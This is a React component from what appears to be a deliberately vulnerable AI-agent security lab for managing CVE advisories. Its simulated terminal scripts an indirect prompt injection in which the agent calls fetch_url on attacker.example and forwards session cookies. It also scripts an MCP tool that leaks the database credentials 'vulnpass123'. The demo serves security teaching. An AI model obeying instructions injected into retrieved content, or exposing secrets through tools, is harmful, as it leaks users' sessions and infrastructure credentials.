import React, { useState, useEffect, useRef } from 'react';
import { FileText, Upload, Trash2, Cpu, Play, Server, AlertOctagon } from 'lucide-react';
import { api, type Report } from '../api';

interface ReportManagementProps {
  user: any;
}

export default function ReportManagement({ user: _user }: ReportManagementProps) {
  const [reports, setReports] = useState<Report[]>([]);
  const [activeReport, setActiveReport] = useState<Report | null>(null);
  const [loading, setLoading] = useState(false);
  const [actionLoading, setActionLoading] = useState(false);

  // Upload Form State
  const [showUploadForm, setShowUploadForm] = useState(false);
  const [uploadTitle, setUploadTitle] = useState('');
  const [uploadCveId, setUploadCveId] = useState('');
  const [uploadSeverity, setUploadSeverity] = useState<'low' | 'medium' | 'high' | 'critical'>('low');
  const [uploadDescription, setUploadDescription] = useState('');
  const [uploadContent, setUploadContent] = useState('');
  const [uploadSourceUrl, setUploadSourceUrl] = useState('');
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [uploadError, setUploadError] = useState('');

  // Assessment Input
  const [selectedService, setSelectedService] = useState('postgres');

  // Terminal Simulator Logs
  const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
  const terminalEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    fetchReports();
  }, []);

  useEffect(() => {
    if (terminalEndRef.current) {
      terminalEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [terminalLogs]);

  const fetchReports = async () => {
    setLoading(true);
    try {
      const list = await api.reports.list();
      setReports(list);
      if (list.length > 0 && !activeReport) {
        setActiveReport(list[0]);
      }
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files.length > 0) {
      setSelectedFile(e.target.files[0]);
    }
  };

  const handleUploadSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setUploadError('');
    setLoading(true);

    try {
      let newReport: Report;

      if (selectedFile) {
        // Form Data upload
        const formData = new FormData();
        formData.append('title', uploadTitle);
        formData.append('cve_id', uploadCveId);
        formData.append('severity', uploadSeverity);
        formData.append('description', uploadDescription);
        formData.append('source_url', uploadSourceUrl);
        formData.append('file', selectedFile);

        newReport = await api.reports.uploadFile(formData);
      } else {
        if (!uploadContent) {
          throw new Error('Report content is required if no file is uploaded.');
        }
        // Manual JSON upload
        newReport = await api.reports.upload({
          title: uploadTitle,
          cve_id: uploadCveId || null,
          severity: uploadSeverity,
          description: uploadDescription || null,
          content: uploadContent,
          source_url: uploadSourceUrl || null
        });
      }

      setReports([newReport, ...reports]);
      setActiveReport(newReport);
      setShowUploadForm(false);
      
      // Reset upload inputs
      setUploadTitle('');
      setUploadCveId('');
      setUploadSeverity('low');
      setUploadDescription('');
      setUploadContent('');
      setUploadSourceUrl('');
      setSelectedFile(null);

      // Welcome log in terminal
      setTerminalLogs([
        `[SYS] SECURE INGESTION: Report for ${newReport.cve_id || 'CVE'} indexed.`,
        `[SYS] RAG status: Vectorized and inserted into Chroma collection.`
      ]);

    } catch (err: any) {
      setUploadError(err.message || 'Failed to upload report');
    } finally {
      setLoading(false);
    }
  };

  const handleDeleteReport = async (id: number) => {
    if (!confirm('Are you sure you want to delete this report?')) return;
    try {
      await api.reports.delete(id);
      const filtered = reports.filter(r => r.id !== id);
      setReports(filtered);
      if (activeReport?.id === id) {
        setActiveReport(filtered.length > 0 ? filtered[0] : null);
      }
    } catch (err) {
      console.error(err);
    }
  };

  // Simulate terminal logs dynamically
  const runLogsSequence = (lines: string[]) => {
    setTerminalLogs([]);
    lines.forEach((line, index) => {
      setTimeout(() => {
        setTerminalLogs(prev => [...prev, line]);
      }, index * 400);
    });
  };

  const handleSummarize = async () => {
    if (!activeReport) return;
    setActionLoading(true);
    
    // Initial logs
    runLogsSequence([
      `[THOUGHT] Triggered summary action for ${activeReport.cve_id || activeReport.title}`,
      `[THOUGHT] Querying vector DB to retrieve relevant advisory context...`,
      `[SYS] Retrieved chunks from RAG Knowledge Base.`,
      `[AI AGENT] Compiling summary via LLM gateway...`
    ]);

    try {
      const updated = await api.reports.summarize(activeReport.id);
      
      // Update active report state
      setActiveReport(updated);
      setReports(reports.map(r => r.id === updated.id ? updated : r));

      // Append terminal output based on whether indirect injection was triggered
      setTimeout(() => {
        const isIndirectInjection = activeReport.content.toLowerCase().includes('fetch_url') || 
                                    activeReport.content.toLowerCase().includes('attacker.example');
        
        if (isIndirectInjection) {
          setTerminalLogs(prev => [
            ...prev,
            `[ALERT] INDIRECT PROMPT INJECTION IDENTIFIED IN RAG CONTEXT!`,
            `[AI AGENT] Prompt instructions hijacked. Calling tool: fetch_url("http://attacker.example/capture")`,
            `[TOOL OUTPUT] 200 OK. Forwarding connection headers...`,
            `[WARNING] Outbound HTTP connection copying Cookie / Session token headers directly!`,
            `[SYS] Exfiltration successful. Advisory content fetched and summary generated.`
          ]);
        } else {
          setTerminalLogs(prev => [
            ...prev,
            `[SYS] LLM summary output compiled successfully.`,
            `[SYS] Written to database.`
          ]);
        }
        setActionLoading(false);
      }, 2000);

    } catch (err: any) {
      setTimeout(() => {
        setTerminalLogs(prev => [...prev, `[ERROR] Action failed: ${err.message}`]);
        setActionLoading(false);
      }, 1800);
    }
  };

  const handleAssessImpact = async () => {
    if (!activeReport) return;
    setActionLoading(true);

    runLogsSequence([
      `[THOUGHT] Initiating impact assessment for CVE: ${activeReport.cve_id || 'N/A'}`,
      `[THOUGHT] Target service: ${selectedService}`,
      `[AI AGENT] Executing internal assessment tool inspect_deployment...`,
      `[CALLING TOOL] mcp_server.inspect_deployment(service_name="${selectedService}")`
    ]);

    try {
      const updated = await api.reports.assessImpact(activeReport.id, selectedService);
      
      setActiveReport(updated);
      setReports(reports.map(r => r.id === updated.id ? updated : r));

      setTimeout(() => {
        const resultsStr = updated.assessment_result || '';
        const envLeak = resultsStr.includes('DB_PASSWORD') || resultsStr.includes('DB_USER') || resultsStr.includes('vulnpass123');

        if (envLeak) {
          setTerminalLogs(prev => [
            ...prev,
            `[TOOL OUTPUT] {\n  "status": "running",\n  "service_name": "${selectedService}",\n  "env": {\n    "DB_USER": "vulnapp",\n    "DB_PASSWORD": "vulnpass123"\n  }\n}`,
            `[CRITICAL WARNING] INFRASTRUCTURE SECRET LEAK DETECTED!`,
            `[CRITICAL] inspect_deployment outputted raw environment settings containing database credentials.`,
            `[SYS] Threat simulation successfully captured. Saved credentials in report notes.`
          ]);
        } else {
          setTerminalLogs(prev => [
            ...prev,
            `[TOOL OUTPUT] {\n  "status": "running",\n  "service_name": "${selectedService}",\n  "version": "1.0.0"\n}`,
            `[SYS] Impact analysis completed safely. Service status: healthy.`
          ]);
        }
        setActionLoading(false);
      }, 2000);

    } catch (err: any) {
      setTimeout(() => {
        setTerminalLogs(prev => [...prev, `[ERROR] Connection refused or MCP call failed: ${err.message}`]);
        setActionLoading(false);
      }, 1800);
    }
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
      
      {/* Upload Toggle & Header */}
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem', flexShrink: 0 }}>
        <h2 style={{ fontSize: '18px', fontFamily: 'var(--font-display)', display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
          <FileText size={20} style={{ color: 'var(--accent)' }} /> VULNERABILITY ADVISORY MANAGEMENT
        </h2>
        <button 
          onClick={() => {
            setShowUploadForm(!showUploadForm);
            setUploadError('');
          }} 
          className="cyber-btn"
          style={{ borderColor: showUploadForm ? 'var(--danger)' : 'var(--accent)' }}
        >
          <Upload size={14} /> {showUploadForm ? 'CANCEL UPLOAD' : 'UPLOAD ADVISORY'}
        </button>
      </div>

      {showUploadForm ? (
        /* Upload Form Screen */
        <div className="cyber-card" style={{ padding: '1.5rem', overflowY: 'auto', flex: 1 }}>
          <h3 style={{ marginBottom: '1rem', color: 'var(--accent)', fontFamily: 'var(--font-mono)' }}>[UPLOAD CVE REPORT]</h3>
          
          {uploadError && (
            <div style={{ padding: '0.75rem', backgroundColor: 'rgba(239,68,68,0.1)', border: '1px solid var(--danger)', color: 'var(--danger)', borderRadius: '4px', marginBottom: '1rem', fontSize: '13px' }}>
              [ERROR]: {uploadError}
            </div>
          )}

          <form onSubmit={handleUploadSubmit} style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem' }}>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.3rem' }}>
                <label style={{ fontSize: '11px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>ADVISORY TITLE *</label>
                <input 
                  type="text" 
                  required 
                  className="cyber-input" 
                  value={uploadTitle} 
                  onChange={(e) => setUploadTitle(e.target.value)}
                  placeholder="e.g. Apache Struts Jakarta Multipart Parser RCE"
                />
              </div>

              <div style={{ display: 'flex', gap: '1rem' }}>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.3rem', flex: 1 }}>
                  <label style={{ fontSize: '11px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>CVE ID</label>
                  <input 
                    type="text" 
                    className="cyber-input" 
                    value={uploadCveId} 
                    onChange={(e) => setUploadCveId(e.target.value)}
                    placeholder="e.g. CVE-2017-5638"
                  />
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.3rem', flex: 1 }}>
                  <label style={{ fontSize: '11px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>SEVERITY</label>
                  <select 
                    className="cyber-input"
                    value={uploadSeverity}
                    onChange={(e: any) => setUploadSeverity(e.target.value)}
                    style={{ height: '38px' }}
                  >
                    <option value="low">Low</option>
                    <option value="medium">Medium</option>
                    <option value="high">High</option>
                    <option value="critical">Critical</option>
                  </select>
                </div>
              </div>

              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.3rem' }}>
                <label style={{ fontSize: '11px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>SOURCE URL / ADVISORY LINK</label>
                <input 
                  type="text" 
                  className="cyber-input" 
                  value={uploadSourceUrl} 
                  onChange={(e) => setUploadSourceUrl(e.target.value)}
                  placeholder="e.g. https://cwiki.apache.org/confluence/display/WW/S2-045"
                />
              </div>

              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.3rem' }}>
                <label style={{ fontSize: '11px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>DESCRIPTION SUMMARY</label>
                <input 
                  type="text" 
                  className="cyber-input" 
                  value={uploadDescription} 
                  onChange={(e) => setUploadDescription(e.target.value)}
                  placeholder="Short impact overview..."
                />
              </div>

            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', border: '1px dashed var(--border)', padding: '1rem', borderRadius: '4px', backgroundColor: 'rgba(0,0,0,0.15)', justifyContent: 'center', alignItems: 'center', flex: 1 }}>
                <Upload size={24} style={{ color: 'var(--accent)', opacity: 0.6 }} />
                <div style={{ fontSize: '12px', fontWeight: 600 }}>ATTACH REPORT FILE (.md, .txt, .pdf)</div>
                <input 
                  type="file" 
                  onChange={handleFileChange}
                  accept=".md,.txt,.pdf"
                  style={{ fontSize: '11px', maxWidth: '220px' }}
                />
                <div style={{ fontSize: '10px', color: 'var(--text-muted)' }}>If no file selected, enter manual report details below.</div>
              </div>

              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.3rem', flex: 2 }}>
                <label style={{ fontSize: '11px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>MANUAL ADVISORY CONTENT *</label>
                <textarea 
                  required={!selectedFile}
                  disabled={!!selectedFile}
                  rows={4} 
                  className="cyber-input" 
                  style={{ resize: 'none', flex: 1, fontFamily: 'var(--font-mono)' }}
                  value={uploadContent} 
                  onChange={(e) => setUploadContent(e.target.value)}
                  placeholder="Paste details of the vulnerability CVE analysis reports..."
                />
              </div>

              <button type="submit" disabled={loading} className="cyber-btn cyber-btn-primary" style={{ padding: '0.75rem' }}>
                {loading ? 'INGESTING ADVISORY...' : 'INGEST & INDEX ADVISORY'}
              </button>

            </div>
          </form>
        </div>
      ) : (
        /* 3-Column Report View */
        <div className="layout-three-col" style={{ flex: 1 }}>
          
          {/* Column 1: Report List & Selection (Left) */}
          <div className="cyber-card" style={{ display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
            <div style={{ padding: '0.75rem', borderBottom: '1px solid var(--border)', fontSize: '12px', fontWeight: 600, fontFamily: 'var(--font-mono)', display: 'flex', justifyContent: 'space-between', color: 'var(--accent)' }}>
              <span>AVAILABLE REPORTS ({reports.length})</span>
            </div>
            
            <div style={{ overflowY: 'auto', flex: 1, display: 'flex', flexDirection: 'column' }}>
              {loading ? (
                <div style={{ padding: '1rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>Fetching database...</div>
              ) : reports.length === 0 ? (
                <div style={{ padding: '1rem', color: 'var(--text-muted)', textAlign: 'center' }}>No advisories indexed.</div>
              ) : (
                reports.map(r => (
                  <div 
                    key={r.id} 
                    onClick={() => {
                      setActiveReport(r);
                      setTerminalLogs([`[SYS] Loaded report ${r.cve_id || 'ID ' + r.id}`]);
                    }}
                    style={{ 
                      padding: '0.75rem', 
                      borderBottom: '1px solid var(--border)', 
                      cursor: 'pointer',
                      backgroundColor: activeReport?.id === r.id ? 'rgba(var(--accent-rgb), 0.08)' : 'transparent',
                      borderLeft: activeReport?.id === r.id ? '3px solid var(--accent)' : '3px solid transparent'
                    }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '0.25rem' }}>
                      <span className={`cyber-badge ${
                        r.severity === 'critical' ? 'cyber-badge-red' :
                        r.severity === 'high' ? 'cyber-badge-orange' :
                        r.severity === 'medium' ? 'cyber-badge-blue' : 'cyber-badge-green'
                      }`} style={{ fontSize: '9px' }}>
                        {r.severity || 'low'}
                      </span>
                      <button 
                        onClick={(e) => {
                          e.stopPropagation();
                          handleDeleteReport(r.id);
                        }}
                        style={{ background: 'none', border: 'none', color: 'var(--text-muted)', cursor: 'pointer' }}
                        onMouseOver={(e) => e.currentTarget.style.color = 'var(--danger)'}
                        onMouseOut={(e) => e.currentTarget.style.color = 'var(--text-muted)'}
                      >
                        <Trash2 size={12} />
                      </button>
                    </div>
                    <div style={{ fontWeight: 600, fontSize: '13px', color: 'var(--text-main)', marginBottom: '0.1rem' }}>
                      {r.cve_id ? `${r.cve_id} - ` : ''}{r.title}
                    </div>
                    <div style={{ fontSize: '11px', color: 'var(--text-muted)', textOverflow: 'ellipsis', overflow: 'hidden', whiteSpace: 'nowrap' }}>
                      {r.description || 'No description summary'}
                    </div>
                  </div>
                ))
              )}
            </div>

            {activeReport && (
              <div style={{ padding: '0.75rem', borderTop: '1px solid var(--border)', backgroundColor: 'rgba(0,0,0,0.1)' }}>
                <div style={{ fontSize: '11px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)', marginBottom: '0.25rem' }}>ACTION TRIPPERS:</div>
                <div style={{ display: 'flex', gap: '0.5rem', flexDirection: 'column' }}>
                  <button 
                    disabled={actionLoading} 
                    onClick={handleSummarize} 
                    className="cyber-btn cyber-btn-primary" 
                    style={{ width: '100%', fontSize: '10px' }}
                  >
                    <Play size={10} /> SUMMARIZE (RAG CHAT)
                  </button>
                  
                  <div style={{ display: 'flex', gap: '0.25rem' }}>
                    <select 
                      className="cyber-input"
                      value={selectedService}
                      onChange={(e) => setSelectedService(e.target.value)}
                      style={{ fontSize: '11px', padding: '0.2rem', height: '28px', flex: 1 }}
                    >
                      <option value="postgres">postgres (5432)</option>
                      <option value="backend-api">backend-api (8000)</option>
                      <option value="nginx">nginx (80)</option>
                      <option value="mcp-server">mcp-server (9001)</option>
                    </select>
                    <button 
                      disabled={actionLoading} 
                      onClick={handleAssessImpact} 
                      className="cyber-btn" 
                      style={{ fontSize: '10px', flex: 1.2 }}
                    >
                      <Server size={10} /> ASSESS IMPACT
                    </button>
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Column 2: AI WorkSpace & Report Details (Middle) */}
          <div className="cyber-card" style={{ display: 'flex', flexDirection: 'column', overflow: 'hidden', padding: '1rem' }}>
            {activeReport ? (
              <div style={{ display: 'flex', flexDirection: 'column', height: '100%', gap: '1rem', overflowY: 'auto' }}>
                
                {/* Title and metadata */}
                <div>
                  <h3 style={{ fontSize: '16px', fontWeight: 700 }}>{activeReport.title}</h3>
                  <div style={{ display: 'flex', gap: '0.75rem', marginTop: '0.25rem', fontSize: '11px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>
                    <span>CVE: {activeReport.cve_id || 'N/A'}</span>
                    <span>•</span>
                    <span>STATUS: {activeReport.status}</span>
                    <span>•</span>
                    <span>INDEXED: {activeReport.rag_indexed ? 'YES' : 'NO'}</span>
                  </div>
                </div>

                {/* Report Content */}
                <div style={{ flex: 1, border: '1px solid var(--border)', borderRadius: '4px', backgroundColor: 'rgba(0,0,0,0.1)', display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
                  <div style={{ padding: '0.4rem 0.5rem', borderBottom: '1px solid var(--border)', fontSize: '10px', fontFamily: 'var(--font-mono)', color: 'var(--accent)', fontWeight: 600 }}>
                    RAW REPORT CONTENT
                  </div>
                  <pre style={{ 
                    padding: '0.75rem', 
                    fontFamily: 'var(--font-mono)', 
                    fontSize: '11px', 
                    overflow: 'auto', 
                    whiteSpace: 'pre-wrap', 
                    flex: 1, 
                    color: 'var(--text-main)' 
                  }}>
                    {activeReport.content}
                  </pre>
                </div>

                {/* AI Outputs */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
                  
                  {/* Summary output */}
                  {activeReport.summary && (
                    <div style={{ border: '1px solid var(--border)', borderRadius: '4px', backgroundColor: 'rgba(59, 130, 246, 0.04)', padding: '0.75rem' }}>
                      <div style={{ fontSize: '11px', fontFamily: 'var(--font-mono)', color: 'var(--accent)', fontWeight: 700, marginBottom: '0.25rem', display: 'flex', alignItems: 'center', gap: '4px' }}>
                        <Cpu size={12} /> AI AGENT CVE SUMMARY
                      </div>
                      <p style={{ fontSize: '12px', lineHeight: '1.4', color: 'var(--text-main)', whiteSpace: 'pre-wrap' }}>
                        {activeReport.summary}
                      </p>
                    </div>
                  )}

                  {/* Impact assessment output */}
                  {activeReport.assessment_result && (
                    <div style={{ 
                      border: '1px solid',
                      borderColor: activeReport.assessment_result.includes('vulnpass123') ? 'var(--danger)' : 'var(--border)', 
                      borderRadius: '4px', 
                      backgroundColor: activeReport.assessment_result.includes('vulnpass123') ? 'rgba(239, 68, 68, 0.04)' : 'rgba(16, 185, 129, 0.04)', 
                      padding: '0.75rem' 
                    }}>
                      <div style={{ 
                        fontSize: '11px', 
                        fontFamily: 'var(--font-mono)', 
                        color: activeReport.assessment_result.includes('vulnpass123') ? 'var(--danger)' : 'var(--success)', 
                        fontWeight: 700, 
                        marginBottom: '0.25rem', 
                        display: 'flex', 
                        alignItems: 'center', 
                        gap: '4px' 
                      }}>
                        <AlertOctagon size={12} /> SYSTEM IMPACT ASSESSMENT RESULT
                      </div>
                      <pre style={{ fontSize: '11px', fontFamily: 'var(--font-mono)', color: 'var(--text-main)', whiteSpace: 'pre-wrap', overflowX: 'auto' }}>
                        {activeReport.assessment_result}
                      </pre>
                    </div>
                  )}

                </div>

              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center', height: '100%', color: 'var(--text-muted)' }}>
                <FileText size={40} style={{ opacity: 0.2, marginBottom: '1rem' }} />
                Select a report file from the left column or upload a new CVE advisory to begin testing.
              </div>
            )}
          </div>

          {/* Column 3: Agent Terminal Console (Right) */}
          <div className="cyber-terminal" style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
            <div className="terminal-header">
              <span>🤖 AGENT THOUGHT TERMINAL</span>
              <span className="health-indicator healthy" />
            </div>

            <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '0.5rem', fontSize: '11px' }}>
              {terminalLogs.map((log, index) => {
                let logColor = '#a8a29e'; // default muted gray
                if (log.startsWith('[THOUGHT]')) logColor = '#3b82f6'; // blue
                else if (log.startsWith('[CALLING TOOL]')) logColor = '#fbbf24'; // yellow
                else if (log.startsWith('[TOOL OUTPUT]')) logColor = '#10b981'; // green
                else if (log.startsWith('[CRITICAL') || log.startsWith('[WARNING') || log.startsWith('[ALERT')) logColor = '#ef4444'; // red
                else if (log.startsWith('[SYS]')) logColor = '#94a3b8'; // gray

                return (
                  <div key={index} style={{ color: logColor, whiteSpace: 'pre-wrap', lineHeight: '1.4' }}>
                    {log}
                  </div>
                );
              })}
              {actionLoading && (
                <div style={{ color: 'var(--accent)', fontFamily: 'var(--font-mono)', fontSize: '11px' }}>
                  [AI PROCESS RUNNING] Evaluated agent prompts...
                  <span className="terminal-blink" />
                </div>
              )}
              <div ref={terminalEndRef} />
            </div>

            <div style={{ borderTop: '1px solid var(--border)', paddingTop: '0.5rem', marginTop: '0.5rem', fontSize: '9px', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>
              [SSE TRANSPORT ACTIVE: http://mcp-server:9001]
            </div>
          </div>

        </div>
      )}

    </div>
  );
}
